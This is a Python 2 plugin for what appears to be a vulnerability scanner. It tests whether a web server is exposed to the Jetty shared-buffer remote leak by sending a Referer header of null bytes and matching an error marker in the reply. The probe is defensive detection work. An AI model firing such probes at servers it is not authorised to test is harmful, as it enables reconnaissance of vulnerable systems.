#!/usr/bin/python
# -*- coding: utf-8 -*-
import re
from engine.engine_utils.common import *
from engine.logger import scanLogger as logger


def run_domain(http,ob):
    request = []
    try:
        result = []
        # server = ob.get("server")
        # if server and server != "memcache":
        #     return []

        scheme = ob['scheme']
        domain = ob['domain']
        path = ob['path']
        ip = ob['ip']
        source_ip = ob.get('source_ip')
        if source_ip:
            ip = source_ip
        import socket
        socket.setdefaulttimeout(5)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if scheme == 'https':
            port = 443
        else:
            port = 80
        s.connect((ip, port))
        flag = "GET / HTTP/1.1\r\nReferer:%s\r\n\r\n" % (chr(0) * 15)

        s.send(flag)
        data = s.recv(512)
        s.close()
        if 'state=HEADER_VALUE' in data and '400' in data:
            new_url = "%s://%s" % (scheme, domain)
            detail = "jetty 共享缓存区远程泄露漏洞"
            request = getRequest(new_url, domain=ob['domain'])
            result.append(getRecord(ob, new_url, ob['level'], detail, request, data))

    except Exception, e:
        logger.error("File:jetty_fefer_domain.py, run_domain function :%s" % (str(e)))

    return result



